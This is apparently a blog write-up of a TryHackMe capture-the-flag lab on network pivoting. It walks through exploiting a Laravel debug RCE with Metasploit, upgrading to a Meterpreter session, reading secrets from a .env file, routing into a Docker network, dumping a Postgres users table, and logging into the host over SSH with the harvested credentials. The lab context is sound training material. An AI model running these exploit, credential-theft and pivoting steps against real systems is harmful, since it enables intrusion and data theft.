---
layout: single
title: "[Day 9] Pivoting Dock the halls "
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

## Docker
When there is a ```/.dockerenv``` in the root directory of the filesystem its a most probably a docker container. 

## Metasploit 
On Kali Metasploit is already installed: ```msfconsole```

Common commands: 

```           
# To search for a module, use the ‘search’ command:
msf6 > search laravel

# Load a module with the ‘use’ command
msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
        
```

Within a module: 

```           
# View the available options to set
show options

# Set the target host and logging
set rhost 10.10.57.242
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run

```


Metasploit has its own routing table which allows to rout traffic from your host to a metasploit session. 

### Socks Proxy
You can run a proxy within Metasploit and even on a compromised machine. 

some commands like curl supports using a proxy like this: ```curl --proxy socks4a://localhost:9050 http://MACHINE_IP```
And if the tool doesn't support it, you can use proxychains: ```roxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP```



### Session
After metasploit exploited a target it opens a session. A session can be upgraded to a meterpreter session.

### Meterpreter 
Is a payload which enables interactive access to a compromised computer. 

## Network pivoting
When you gained a entrypoint into a system you can run network scanning tools like nmap and arp to find additional machines which where not reachable previously.


## Walkthrough

Starting with nmap on the target: ```nmap -T4 -A -Pn 10.10.57.242``` gives us the open port 80 with apache behind it. 
![nmap_start](/assets/images/tryhackme/day9/nmap.PNG)

Seems like we can just open a website on port 80. This gives us the info that laravel is used. 
![laravel](/assets/images/tryhackme/day9/laravel.PNG)

Run Metasploit: ```msfconsole```
Run ```search laravel```
Run ```use exploit/multi/php/ignition_laravel_debug_rce```

![laravel](/assets/images/tryhackme/day9/metasploit.PNG)

Within the module:
Run ```show info```
Run ```check RHOSTS=10.10.57.242 HttpClientTimeout=20```
![laravel](/assets/images/tryhackme/day9/metasploit-Check.PNG)

We need to check our own ip address by running ```ip addr``` in normal console. 
![ip addr](/assets/images/tryhackme/day9/getmyownip.PNG)


within the laravel module, lets run: ```un RHOSTS=10.10.57.242 LHOST=10.18.65.121 HttpClientTimeout=20```
![metasploit run](/assets/images/tryhackme/day9/metasploit-run.PNG)

Lets put the session into background and list all sessions: 
![metasploit background](/assets/images/tryhackme/day9/metasploit-background.PNG)

Now we upgrade the last session to meterpreter session: ```sessions -u -1``` and read an .env file
![metasploit background](/assets/images/tryhackme/day9/meterpreter-getenv.PNG)

we resolve the found webservice into IP address: ```resolve webservice_databse```
This means there is another host on the network and we can pivoting to it. 
![metasploit background](/assets/images/tryhackme/day9/anotherhost.PNG)

We also see that we are in a docker container
![In a docker container](/assets/images/tryhackme/day9/in-a-docker-container.PNG)

Now we add a route on metasploit: ```route add 172.28.101.51/32 -1```
We also add the route for the dockers default ip address to connect resources on its host: ```route add 172.17.0.1/32 -1```

```   
# Dump the schema
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres

# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
```        
![Schemadump](/assets/images/tryhackme/day9/schemadump.PNG)
![SQL command](/assets/images/tryhackme/day9/sql-command.PNG)

Now we can run something like this: ```curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v```
The proxy will route this traffic to our target and the target will call its host machine. 

We can now scan the targets host system: ```proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1```

![nmap target host](/assets/images/tryhackme/day9/nmap-targets-host.PNG)
We see that SSH port is open on the host machine.  

Using the username and password we got from the database: ```run ssh://santa:p4$$w0rd@172.17.0.1```
![nmap target host](/assets/images/tryhackme/day9/ssh-session.PNG)